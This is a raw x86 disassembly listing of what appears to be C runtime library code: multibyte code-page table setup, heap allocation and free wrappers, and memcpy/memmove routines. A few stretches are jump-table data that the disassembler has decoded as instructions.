  424024:	push   ebp
  424025:	mov    ebp,esp
  424027:	sub    esp,0x518
  42402d:	mov    eax,ds:0x45c430
  424032:	xor    eax,DWORD PTR [ebp+0x4]
  424035:	push   esi
  424036:	mov    DWORD PTR [ebp-0x4],eax
  424039:	lea    eax,[ebp-0x18]
  42403c:	push   eax
  42403d:	push   DWORD PTR ds:0x45d024
  424043:	call   DWORD PTR ds:0x4280a4
  424049:	cmp    eax,0x1
  42404c:	mov    esi,0x100
  424051:	jne    0x424164
  424057:	xor    eax,eax
  424059:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424060:	inc    eax
  424061:	cmp    eax,esi
  424063:	jb     0x424059
  424065:	mov    al,BYTE PTR [ebp-0x12]
  424068:	test   al,al
  42406a:	mov    BYTE PTR [ebp-0x118],0x20
  424071:	je     0x4240a9
  424073:	push   ebx
  424074:	lea    edx,[ebp-0x11]
  424077:	push   edi
  424078:	movzx  ecx,BYTE PTR [edx]
  42407b:	movzx  eax,al
  42407e:	cmp    eax,ecx
  424080:	ja     0x42409f
  424082:	sub    ecx,eax
  424084:	inc    ecx
  424085:	mov    ebx,ecx
  424087:	shr    ecx,0x2
  42408a:	lea    edi,[ebp+eax*1-0x118]
  424091:	mov    eax,0x20202020
  424096:	rep stos DWORD PTR es:[edi],eax
  424098:	mov    ecx,ebx
  42409a:	and    ecx,0x3
  42409d:	rep stos BYTE PTR es:[edi],al
  42409f:	inc    edx
  4240a0:	mov    al,BYTE PTR [edx]
  4240a2:	inc    edx
  4240a3:	test   al,al
  4240a5:	jne    0x424078
  4240a7:	pop    edi
  4240a8:	pop    ebx
  4240a9:	push   0x0
  4240ab:	push   DWORD PTR ds:0x45cf14
  4240b1:	lea    eax,[ebp-0x518]
  4240b7:	push   DWORD PTR ds:0x45d024
  4240bd:	push   eax
  4240be:	push   esi
  4240bf:	lea    eax,[ebp-0x118]
  4240c5:	push   eax
  4240c6:	push   0x1
  4240c8:	call   0x425fd8
  4240cd:	push   0x0
  4240cf:	push   DWORD PTR ds:0x45d024
  4240d5:	lea    eax,[ebp-0x218]
  4240db:	push   esi
  4240dc:	push   eax
  4240dd:	push   esi
  4240de:	lea    eax,[ebp-0x118]
  4240e4:	push   eax
  4240e5:	push   esi
  4240e6:	push   DWORD PTR ds:0x45cf14
  4240ec:	call   0x425c1c
  4240f1:	push   0x0
  4240f3:	push   DWORD PTR ds:0x45d024
  4240f9:	lea    eax,[ebp-0x318]
  4240ff:	push   esi
  424100:	push   eax
  424101:	push   esi
  424102:	lea    eax,[ebp-0x118]
  424108:	push   eax
  424109:	push   0x200
  42410e:	push   DWORD PTR ds:0x45cf14
  424114:	call   0x425c1c
  424119:	add    esp,0x5c
  42411c:	xor    eax,eax
  42411e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  424126:	test   cl,0x1
  424129:	je     0x424141
  42412b:	or     BYTE PTR [eax+0x45cf21],0x10
  424132:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  424139:	mov    BYTE PTR [eax+0x45d040],cl
  42413f:	jmp    0x42415d
  424141:	test   cl,0x2
  424144:	je     0x424156
  424146:	or     BYTE PTR [eax+0x45cf21],0x20
  42414d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424154:	jmp    0x424139
  424156:	and    BYTE PTR [eax+0x45d040],0x0
  42415d:	inc    eax
  42415e:	cmp    eax,esi
  424160:	jb     0x42411e
  424162:	jmp    0x4241a8
  424164:	xor    eax,eax
  424166:	cmp    eax,0x41
  424169:	jb     0x424184
  42416b:	cmp    eax,0x5a
  42416e:	ja     0x424184
  424170:	or     BYTE PTR [eax+0x45cf21],0x10
  424177:	mov    cl,al
  424179:	add    cl,0x20
  42417c:	mov    BYTE PTR [eax+0x45d040],cl
  424182:	jmp    0x4241a3
  424184:	cmp    eax,0x61
  424187:	jb     0x42419c
  424189:	cmp    eax,0x7a
  42418c:	ja     0x42419c
  42418e:	or     BYTE PTR [eax+0x45cf21],0x20
  424195:	mov    cl,al
  424197:	sub    cl,0x20
  42419a:	jmp    0x42417c
  42419c:	and    BYTE PTR [eax+0x45d040],0x0
  4241a3:	inc    eax
  4241a4:	cmp    eax,esi
  4241a6:	jb     0x424166
  4241a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4241ab:	xor    ecx,DWORD PTR [ebp+0x4]
  4241ae:	pop    esi
  4241af:	call   0x423f7c
  4241b4:	leave  
  4241b5:	ret    
  4241b6:	push   ebp
  4241b7:	mov    ebp,esp
  4241b9:	sub    esp,0x1c
  4241bc:	mov    eax,ds:0x45c430
  4241c1:	xor    eax,DWORD PTR [ebp+0x4]
  4241c4:	push   ebx
  4241c5:	push   esi
  4241c6:	mov    esi,DWORD PTR [ebp+0x8]
  4241c9:	xor    ebx,ebx
  4241cb:	cmp    esi,ebx
  4241cd:	mov    DWORD PTR [ebp-0x4],eax
  4241d0:	push   edi
  4241d1:	je     0x42432b
  4241d7:	xor    edx,edx
  4241d9:	xor    eax,eax
  4241db:	cmp    DWORD PTR [eax+0x45c440],esi
  4241e1:	je     0x424248
  4241e3:	add    eax,0x30
  4241e6:	inc    edx
  4241e7:	cmp    eax,0xf0
  4241ec:	jb     0x4241db
  4241ee:	lea    eax,[ebp-0x1c]
  4241f1:	push   eax
  4241f2:	push   esi
  4241f3:	call   DWORD PTR ds:0x4280a4
  4241f9:	cmp    eax,0x1
  4241fc:	jne    0x424323
  424202:	push   0x40
  424204:	xor    eax,eax
  424206:	cmp    DWORD PTR [ebp-0x1c],0x1
  42420a:	pop    ecx
  42420b:	mov    edi,0x45cf20
  424210:	rep stos DWORD PTR es:[edi],eax
  424212:	stos   BYTE PTR es:[edi],al
  424213:	mov    DWORD PTR ds:0x45d024,esi
  424219:	mov    DWORD PTR ds:0x45cf14,ebx
  42421f:	jbe    0x424311
  424225:	cmp    BYTE PTR [ebp-0x16],0x0
  424229:	je     0x4242e9
  42422f:	lea    ecx,[ebp-0x15]
  424232:	mov    dl,BYTE PTR [ecx]
  424234:	test   dl,dl
  424236:	je     0x4242e9
  42423c:	movzx  eax,BYTE PTR [ecx-0x1]
  424240:	movzx  edx,dl
  424243:	jmp    0x4242d9
  424248:	push   0x40
  42424a:	xor    eax,eax
  42424c:	pop    ecx
  42424d:	mov    edi,0x45cf20
  424252:	rep stos DWORD PTR es:[edi],eax
  424254:	lea    ecx,[edx+edx*2]
  424257:	shl    ecx,0x4
  42425a:	mov    DWORD PTR [ebp-0x8],ebx
  42425d:	stos   BYTE PTR es:[edi],al
  42425e:	lea    ebx,[ecx+0x45c450]
  424264:	mov    al,BYTE PTR [ebx]
  424266:	mov    esi,ebx
  424268:	jmp    0x424293
  42426a:	mov    dl,BYTE PTR [esi+0x1]
  42426d:	test   dl,dl
  42426f:	je     0x424297
  424271:	movzx  eax,al
  424274:	movzx  edi,dl
  424277:	cmp    eax,edi
  424279:	ja     0x42428f
  42427b:	mov    edx,DWORD PTR [ebp-0x8]
  42427e:	mov    dl,BYTE PTR [edx+0x45c438]
  424284:	or     BYTE PTR [eax+0x45cf21],dl
  42428a:	inc    eax
  42428b:	cmp    eax,edi
  42428d:	jbe    0x424284
  42428f:	inc    esi
  424290:	inc    esi
  424291:	mov    al,BYTE PTR [esi]
  424293:	test   al,al
  424295:	jne    0x42426a
  424297:	inc    DWORD PTR [ebp-0x8]
  42429a:	add    ebx,0x8
  42429d:	cmp    DWORD PTR [ebp-0x8],0x4
  4242a1:	jb     0x424264
  4242a3:	mov    eax,DWORD PTR [ebp+0x8]
  4242a6:	mov    ds:0x45d024,eax
  4242ab:	mov    DWORD PTR ds:0x45cf1c,0x1
  4242b5:	call   0x423fcc
  4242ba:	lea    ecx,[ecx+0x45c444]
  4242c0:	mov    esi,ecx
  4242c2:	mov    edi,0x45d030
  4242c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c9:	mov    ds:0x45cf14,eax
  4242ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242cf:	jmp    0x424330
  4242d1:	or     BYTE PTR [eax+0x45cf21],0x4
  4242d8:	inc    eax
  4242d9:	cmp    eax,edx
  4242db:	jbe    0x4242d1
  4242dd:	inc    ecx
  4242de:	inc    ecx
  4242df:	cmp    BYTE PTR [ecx-0x1],0x0
  4242e3:	jne    0x424232
  4242e9:	xor    ecx,ecx
  4242eb:	inc    ecx
  4242ec:	mov    eax,ecx
  4242ee:	or     BYTE PTR [eax+0x45cf21],0x8
  4242f5:	inc    eax
  4242f6:	cmp    eax,0xff
  4242fb:	jb     0x4242ee
  4242fd:	mov    eax,esi
  4242ff:	call   0x423fcc
  424304:	mov    ds:0x45cf14,eax
  424309:	mov    DWORD PTR ds:0x45cf1c,ecx
  42430f:	jmp    0x424317
  424311:	mov    DWORD PTR ds:0x45cf1c,ebx
  424317:	xor    eax,eax
  424319:	mov    edi,0x45d030
  42431e:	stos   DWORD PTR es:[edi],eax
  42431f:	stos   DWORD PTR es:[edi],eax
  424320:	stos   DWORD PTR es:[edi],eax
  424321:	jmp    0x424330
  424323:	cmp    DWORD PTR ds:0x45cd84,ebx
  424329:	je     0x424339
  42432b:	call   0x423ffb
  424330:	call   0x424024
  424335:	xor    eax,eax
  424337:	jmp    0x42433c
  424339:	or     eax,0xffffffff
  42433c:	mov    ecx,DWORD PTR [ebp-0x4]
  42433f:	xor    ecx,DWORD PTR [ebp+0x4]
  424342:	pop    edi
  424343:	pop    esi
  424344:	pop    ebx
  424345:	call   0x423f7c
  42434a:	leave  
  42434b:	ret    
  42434c:	push   0x14
  42434e:	push   0x428558
  424353:	call   0x4238a8
  424358:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42435c:	push   0xd
  42435e:	call   0x423a6f
  424363:	pop    ecx
  424364:	xor    edi,edi
  424366:	mov    DWORD PTR [ebp-0x4],edi
  424369:	mov    DWORD PTR ds:0x45cd84,edi
  42436f:	mov    eax,DWORD PTR [ebp+0x8]
  424372:	cmp    eax,0xfffffffe
  424375:	jne    0x424389
  424377:	mov    DWORD PTR ds:0x45cd84,0x1
  424381:	call   DWORD PTR ds:0x4280a0
  424387:	jmp    0x4243b4
  424389:	cmp    eax,0xfffffffd
  42438c:	jne    0x4243a0
  42438e:	mov    DWORD PTR ds:0x45cd84,0x1
  424398:	call   DWORD PTR ds:0x42809c
  42439e:	jmp    0x4243b4
  4243a0:	cmp    eax,0xfffffffc
  4243a3:	jne    0x4243b4
  4243a5:	mov    DWORD PTR ds:0x45cd84,0x1
  4243af:	mov    eax,ds:0x45cdb4
  4243b4:	mov    DWORD PTR [ebp+0x8],eax
  4243b7:	cmp    eax,DWORD PTR ds:0x45d024
  4243bd:	je     0x42447e
  4243c3:	mov    esi,DWORD PTR ds:0x45cf18
  4243c9:	mov    DWORD PTR [ebp-0x20],esi
  4243cc:	cmp    esi,edi
  4243ce:	je     0x4243d4
  4243d0:	cmp    DWORD PTR [esi],edi
  4243d2:	je     0x4243e4
  4243d4:	push   0x220
  4243d9:	call   0x4245d2
  4243de:	pop    ecx
  4243df:	mov    esi,eax
  4243e1:	mov    DWORD PTR [ebp-0x20],esi
  4243e4:	cmp    esi,edi
  4243e6:	je     0x424467
  4243e8:	push   DWORD PTR [ebp+0x8]
  4243eb:	call   0x4241b6
  4243f0:	pop    ecx
  4243f1:	mov    DWORD PTR [ebp-0x1c],eax
  4243f4:	cmp    eax,edi
  4243f6:	jne    0x424467
  4243f8:	mov    DWORD PTR [esi],edi
  4243fa:	mov    eax,ds:0x45d024
  4243ff:	mov    DWORD PTR [esi+0x4],eax
  424402:	mov    eax,ds:0x45cf1c
  424407:	mov    DWORD PTR [esi+0x8],eax
  42440a:	mov    eax,ds:0x45cf14
  42440f:	mov    DWORD PTR [esi+0xc],eax
  424412:	xor    eax,eax
  424414:	mov    DWORD PTR [ebp-0x24],eax
  424417:	cmp    eax,0x5
  42441a:	jge    0x42442c
  42441c:	mov    cx,WORD PTR [eax*2+0x45d030]
  424424:	mov    WORD PTR [esi+eax*2+0x10],cx
  424429:	inc    eax
  42442a:	jmp    0x424414
  42442c:	xor    eax,eax
  42442e:	mov    DWORD PTR [ebp-0x24],eax
  424431:	cmp    eax,0x101
  424436:	jge    0x424445
  424438:	mov    cl,BYTE PTR [eax+0x45cf20]
  42443e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  424442:	inc    eax
  424443:	jmp    0x42442e
  424445:	xor    eax,eax
  424447:	mov    DWORD PTR [ebp-0x24],eax
  42444a:	cmp    eax,0x100
  42444f:	jge    0x424461
  424451:	mov    cl,BYTE PTR [eax+0x45d040]
  424457:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42445e:	inc    eax
  42445f:	jmp    0x424447
  424461:	mov    DWORD PTR ds:0x45cf18,esi
  424467:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42446b:	jne    0x424481
  42446d:	cmp    esi,DWORD PTR ds:0x45cf18
  424473:	je     0x424481
  424475:	push   esi
  424476:	call   0x4244ba
  42447b:	pop    ecx
  42447c:	jmp    0x424481
  42447e:	mov    DWORD PTR [ebp-0x1c],edi
  424481:	or     DWORD PTR [ebp-0x4],0xffffffff
  424485:	call   0x424493
  42448a:	mov    eax,DWORD PTR [ebp-0x1c]
  42448d:	call   0x4238e3
  424492:	ret    
  424493:	push   0xd
  424495:	call   0x4239db
  42449a:	pop    ecx
  42449b:	ret    
  42449c:	cmp    DWORD PTR ds:0x45d26c,0x0
  4244a3:	jne    0x4244b7
  4244a5:	push   0xfffffffd
  4244a7:	call   0x42434c
  4244ac:	pop    ecx
  4244ad:	mov    DWORD PTR ds:0x45d26c,0x1
  4244b7:	xor    eax,eax
  4244b9:	ret    
  4244ba:	push   0xc
  4244bc:	push   0x428568
  4244c1:	call   0x4238a8
  4244c6:	mov    esi,DWORD PTR [ebp+0x8]
  4244c9:	test   esi,esi
  4244cb:	je     0x424525
  4244cd:	cmp    DWORD PTR ds:0x45d144,0x3
  4244d4:	jne    0x424516
  4244d6:	push   0x4
  4244d8:	call   0x423a6f
  4244dd:	pop    ecx
  4244de:	and    DWORD PTR [ebp-0x4],0x0
  4244e2:	push   esi
  4244e3:	call   0x424c92
  4244e8:	pop    ecx
  4244e9:	mov    DWORD PTR [ebp-0x1c],eax
  4244ec:	test   eax,eax
  4244ee:	je     0x4244f9
  4244f0:	push   esi
  4244f1:	push   eax
  4244f2:	call   0x424cbd
  4244f7:	pop    ecx
  4244f8:	pop    ecx
  4244f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244fd:	call   0x42450d
  424502:	cmp    DWORD PTR [ebp-0x1c],0x0
  424506:	jne    0x424525
  424508:	push   DWORD PTR [ebp+0x8]
  42450b:	jmp    0x424517
  42450d:	push   0x4
  42450f:	call   0x4239db
  424514:	pop    ecx
  424515:	ret    
  424516:	push   esi
  424517:	push   0x0
  424519:	push   DWORD PTR ds:0x45d140
  42451f:	call   DWORD PTR ds:0x42808c
  424525:	call   0x4238e3
  42452a:	ret    
  42452b:	push   0xc
  42452d:	push   0x428578
  424532:	call   0x4238a8
  424537:	mov    esi,DWORD PTR [ebp+0x8]
  42453a:	cmp    DWORD PTR ds:0x45d144,0x3
  424541:	jne    0x424571
  424543:	cmp    esi,DWORD PTR ds:0x45cf04
  424549:	ja     0x424571
  42454b:	push   0x4
  42454d:	call   0x423a6f
  424552:	pop    ecx
  424553:	and    DWORD PTR [ebp-0x4],0x0
  424557:	push   esi
  424558:	call   0x425471
  42455d:	pop    ecx
  42455e:	mov    DWORD PTR [ebp-0x1c],eax
  424561:	or     DWORD PTR [ebp-0x4],0xffffffff
  424565:	call   0x42459d
  42456a:	mov    eax,DWORD PTR [ebp-0x1c]
  42456d:	test   eax,eax
  42456f:	jne    0x424594
  424571:	test   esi,esi
  424573:	jne    0x424576
  424575:	inc    esi
  424576:	cmp    DWORD PTR ds:0x45d144,0x1
  42457d:	je     0x424585
  42457f:	add    esi,0xf
  424582:	and    esi,0xfffffff0
  424585:	push   esi
  424586:	push   0x0
  424588:	push   DWORD PTR ds:0x45d140
  42458e:	call   DWORD PTR ds:0x4280a8
  424594:	call   0x4238e3
  424599:	ret    
  42459a:	mov    esi,DWORD PTR [ebp+0x8]
  42459d:	push   0x4
  42459f:	call   0x4239db
  4245a4:	pop    ecx
  4245a5:	ret    
  4245a6:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4245ab:	ja     0x4245cf
  4245ad:	push   DWORD PTR [esp+0x4]
  4245b1:	call   0x42452b
  4245b6:	test   eax,eax
  4245b8:	pop    ecx
  4245b9:	jne    0x4245d1
  4245bb:	cmp    DWORD PTR [esp+0x8],eax
  4245bf:	je     0x4245d1
  4245c1:	push   DWORD PTR [esp+0x4]
  4245c5:	call   0x426192
  4245ca:	test   eax,eax
  4245cc:	pop    ecx
  4245cd:	jne    0x4245ad
  4245cf:	xor    eax,eax
  4245d1:	ret    
  4245d2:	push   DWORD PTR ds:0x45cdc8
  4245d8:	push   DWORD PTR [esp+0x8]
  4245dc:	call   0x4245a6
  4245e1:	pop    ecx
  4245e2:	pop    ecx
  4245e3:	ret    
  4245e4:	int3   
  4245e5:	int3   
  4245e6:	int3   
  4245e7:	int3   
  4245e8:	int3   
  4245e9:	int3   
  4245ea:	int3   
  4245eb:	int3   
  4245ec:	int3   
  4245ed:	int3   
  4245ee:	int3   
  4245ef:	int3   
  4245f0:	push   ebp
  4245f1:	mov    ebp,esp
  4245f3:	push   edi
  4245f4:	push   esi
  4245f5:	mov    esi,DWORD PTR [ebp+0xc]
  4245f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245fb:	mov    edi,DWORD PTR [ebp+0x8]
  4245fe:	mov    eax,ecx
  424600:	mov    edx,ecx
  424602:	add    eax,esi
  424604:	cmp    edi,esi
  424606:	jbe    0x424610
  424608:	cmp    edi,eax
  42460a:	jb     0x42478c
  424610:	test   edi,0x3
  424616:	jne    0x42462c
  424618:	shr    ecx,0x2
  42461b:	and    edx,0x3
  42461e:	cmp    ecx,0x8
  424621:	jb     0x42464c
  424623:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424625:	jmp    DWORD PTR [edx*4+0x42473c]
  42462c:	mov    eax,edi
  42462e:	mov    edx,0x3
  424633:	sub    ecx,0x4
  424636:	jb     0x424644
  424638:	and    eax,0x3
  42463b:	add    ecx,eax
  42463d:	jmp    DWORD PTR [eax*4+0x424650]
  424644:	jmp    DWORD PTR [ecx*4+0x42474c]
  42464b:	nop
  42464c:	jmp    DWORD PTR [ecx*4+0x4246d0]
  424653:	nop
  424654:	pusha  
  424655:	inc    esi
  424656:	inc    edx
  424657:	add    BYTE PTR [esi+eax*2+0x46b00042],cl
  42465e:	inc    edx
  42465f:	add    BYTE PTR [ebx],ah
  424661:	ror    DWORD PTR [edx-0x75f877fa],1
  424667:	inc    esi
  424668:	add    DWORD PTR [eax+0x468a0147],ecx
  42466e:	add    al,cl
  424670:	jmp    0x289ce77
  424675:	add    esi,0x3
  424678:	add    edi,0x3
  42467b:	cmp    ecx,0x8
  42467e:	jb     0x42464c
  424680:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424682:	jmp    DWORD PTR [edx*4+0x42473c]
  424689:	lea    ecx,[ecx+0x0]
  42468c:	and    edx,ecx
  42468e:	mov    al,BYTE PTR [esi]
  424690:	mov    BYTE PTR [edi],al
  424692:	mov    al,BYTE PTR [esi+0x1]
  424695:	shr    ecx,0x2
  424698:	mov    BYTE PTR [edi+0x1],al
  42469b:	add    esi,0x2
  42469e:	add    edi,0x2
  4246a1:	cmp    ecx,0x8
  4246a4:	jb     0x42464c
  4246a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a8:	jmp    DWORD PTR [edx*4+0x42473c]
  4246af:	nop
  4246b0:	and    edx,ecx
  4246b2:	mov    al,BYTE PTR [esi]
  4246b4:	mov    BYTE PTR [edi],al
  4246b6:	add    esi,0x1
  4246b9:	shr    ecx,0x2
  4246bc:	add    edi,0x1
  4246bf:	cmp    ecx,0x8
  4246c2:	jb     0x42464c
  4246c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c6:	jmp    DWORD PTR [edx*4+0x42473c]
  4246cd:	lea    ecx,[ecx+0x0]
  4246d0:	xor    eax,DWORD PTR [edi+0x42]
  4246d3:	add    BYTE PTR [eax],ah
  4246d5:	inc    edi
  4246d6:	inc    edx
  4246d7:	add    BYTE PTR [eax],bl
  4246d9:	inc    edi
  4246da:	inc    edx
  4246db:	add    BYTE PTR [eax],dl
  4246dd:	inc    edi
  4246de:	inc    edx
  4246df:	add    BYTE PTR [eax],cl
  4246e1:	inc    edi
  4246e2:	inc    edx
  4246e3:	add    BYTE PTR [eax],al
  4246e5:	inc    edi
  4246e6:	inc    edx
  4246e7:	add    al,bh
  4246e9:	inc    esi
  4246ea:	inc    edx
  4246eb:	add    al,dh
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246f5:	inc    esp
  4246f6:	(bad)  
  4246f7:	in     al,0x8b
  4246f9:	inc    esp
  4246fa:	mov    gs,eax
  4246fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424700:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424704:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424708:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42470c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  424710:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  424714:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  424718:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42471c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  424720:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  424724:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  424728:	lea    eax,[ecx*4+0x0]
  42472f:	add    esi,eax
  424731:	add    edi,eax
  424733:	jmp    DWORD PTR [edx*4+0x42473c]
  42473a:	mov    edi,edi
  42473c:	dec    esp
  42473d:	inc    edi
  42473e:	inc    edx
  42473f:	add    BYTE PTR [edi+eax*2+0x42],dl
  424743:	add    BYTE PTR [eax+0x47],ah
  424746:	inc    edx
  424747:	add    BYTE PTR [edi+eax*2+0x42],dh
  42474b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424751:	leave  
  424752:	ret    
  424753:	nop
  424754:	mov    al,BYTE PTR [esi]
  424756:	mov    BYTE PTR [edi],al
  424758:	mov    eax,DWORD PTR [ebp+0x8]
  42475b:	pop    esi
  42475c:	pop    edi
  42475d:	leave  
  42475e:	ret    
  42475f:	nop
  424760:	mov    al,BYTE PTR [esi]
  424762:	mov    BYTE PTR [edi],al
  424764:	mov    al,BYTE PTR [esi+0x1]
  424767:	mov    BYTE PTR [edi+0x1],al
  42476a:	mov    eax,DWORD PTR [ebp+0x8]
  42476d:	pop    esi
  42476e:	pop    edi
  42476f:	leave  
  424770:	ret    
  424771:	lea    ecx,[ecx+0x0]
  424774:	mov    al,BYTE PTR [esi]
  424776:	mov    BYTE PTR [edi],al
  424778:	mov    al,BYTE PTR [esi+0x1]
  42477b:	mov    BYTE PTR [edi+0x1],al
  42477e:	mov    al,BYTE PTR [esi+0x2]
  424781:	mov    BYTE PTR [edi+0x2],al
  424784:	mov    eax,DWORD PTR [ebp+0x8]
  424787:	pop    esi
  424788:	pop    edi
  424789:	leave  
  42478a:	ret    
  42478b:	nop
  42478c:	lea    esi,[ecx+esi*1-0x4]
  424790:	lea    edi,[ecx+edi*1-0x4]
  424794:	test   edi,0x3
  42479a:	jne    0x4247c0
  42479c:	shr    ecx,0x2
  42479f:	and    edx,0x3
  4247a2:	cmp    ecx,0x8
  4247a5:	jb     0x4247b4
  4247a7:	std    
  4247a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247aa:	cld    
  4247ab:	jmp    DWORD PTR [edx*4+0x4248d8]
  4247b2:	mov    edi,edi
  4247b4:	neg    ecx
  4247b6:	jmp    DWORD PTR [ecx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    eax,edi
  4247c2:	mov    edx,0x3
  4247c7:	cmp    ecx,0x4
  4247ca:	jb     0x4247d8
  4247cc:	and    eax,0x3
  4247cf:	sub    ecx,eax
  4247d1:	jmp    DWORD PTR [eax*4+0x4247dc]
  4247d8:	jmp    DWORD PTR [ecx*4+0x4248d8]
  4247df:	nop
  4247e0:	in     al,dx
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],dl
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax],bh
  4247e9:	dec    eax
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247f1:	mov    BYTE PTR [edi+0x3],al
  4247f4:	sub    esi,0x1
  4247f7:	shr    ecx,0x2
  4247fa:	sub    edi,0x1
  4247fd:	cmp    ecx,0x8
  424800:	jb     0x4247b4
  424802:	std    
  424803:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424805:	cld    
  424806:	jmp    DWORD PTR [edx*4+0x4248d8]
  42480d:	lea    ecx,[ecx+0x0]
  424810:	mov    al,BYTE PTR [esi+0x3]
  424813:	and    edx,ecx
  424815:	mov    BYTE PTR [edi+0x3],al
  424818:	mov    al,BYTE PTR [esi+0x2]
  42481b:	shr    ecx,0x2
  42481e:	mov    BYTE PTR [edi+0x2],al
  424821:	sub    esi,0x2
  424824:	sub    edi,0x2
  424827:	cmp    ecx,0x8
  42482a:	jb     0x4247b4
  42482c:	std    
  42482d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42482f:	cld    
  424830:	jmp    DWORD PTR [edx*4+0x4248d8]
  424837:	nop
  424838:	mov    al,BYTE PTR [esi+0x3]
  42483b:	and    edx,ecx
  42483d:	mov    BYTE PTR [edi+0x3],al
  424840:	mov    al,BYTE PTR [esi+0x2]
  424843:	mov    BYTE PTR [edi+0x2],al
  424846:	mov    al,BYTE PTR [esi+0x1]
  424849:	shr    ecx,0x2
  42484c:	mov    BYTE PTR [edi+0x1],al
  42484f:	sub    esi,0x3
  424852:	sub    edi,0x3
  424855:	cmp    ecx,0x8
  424858:	jb     0x4247b4
  42485e:	std    
  42485f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424861:	cld    
  424862:	jmp    DWORD PTR [edx*4+0x4248d8]
  424869:	lea    ecx,[ecx+0x0]
  42486c:	mov    WORD PTR [eax+0x42],cs
  42486f:	add    BYTE PTR [eax+ecx*2+0x489c0042],dl
  424876:	inc    edx
  424877:	add    BYTE PTR [eax+ecx*2+0x48ac0042],ah
  42487e:	inc    edx
  42487f:	add    BYTE PTR [eax+ecx*2+0x48bc0042],dh
  424886:	inc    edx
  424887:	add    bh,cl
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424891:	inc    esp
  424892:	(bad)  
  424893:	sbb    al,0x8b
  424895:	inc    esp
  424896:	mov    ds,WORD PTR [eax]
  424898:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42489c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4248a0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  4248a4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4248a8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4248ac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4248b0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4248b4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4248b8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4248bc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4248c0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4248c4:	lea    eax,[ecx*4+0x0]
  4248cb:	add    esi,eax
  4248cd:	add    edi,eax
  4248cf:	jmp    DWORD PTR [edx*4+0x4248d8]
  4248d6:	mov    edi,edi
  4248d8:	call   0xf0428b25
  4248dd:	dec    eax
  4248de:	inc    edx
  4248df:	add    BYTE PTR [eax],al
  4248e1:	dec    ecx
  4248e2:	inc    edx
  4248e3:	add    BYTE PTR [ecx+ecx*2],dl
  4248e6:	inc    edx
  4248e7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4248ed:	leave  
  4248ee:	ret    
  4248ef:	nop
  4248f0:	mov    al,BYTE PTR [esi+0x3]
  4248f3:	mov    BYTE PTR [edi+0x3],al
  4248f6:	mov    eax,DWORD PTR [ebp+0x8]
  4248f9:	pop    esi
  4248fa:	pop    edi
  4248fb:	leave  
  4248fc:	ret    
  4248fd:	lea    ecx,[ecx+0x0]
  424900:	mov    al,BYTE PTR [esi+0x3]
  424903:	mov    BYTE PTR [edi+0x3],al
  424906:	mov    al,BYTE PTR [esi+0x2]
  424909:	mov    BYTE PTR [edi+0x2],al
  42490c:	mov    eax,DWORD PTR [ebp+0x8]
  42490f:	pop    esi
  424910:	pop    edi
  424911:	leave  
  424912:	ret    
  424913:	nop
  424914:	mov    al,BYTE PTR [esi+0x3]
  424917:	mov    BYTE PTR [edi+0x3],al
  42491a:	mov    al,BYTE PTR [esi+0x2]
  42491d:	mov    BYTE PTR [edi+0x2],al
  424920:	mov    al,BYTE PTR [esi+0x1]
  424923:	mov    BYTE PTR [edi+0x1],al
  424926:	mov    eax,DWORD PTR [ebp+0x8]
  424929:	pop    esi
  42492a:	pop    edi
  42492b:	leave  
  42492c:	ret    
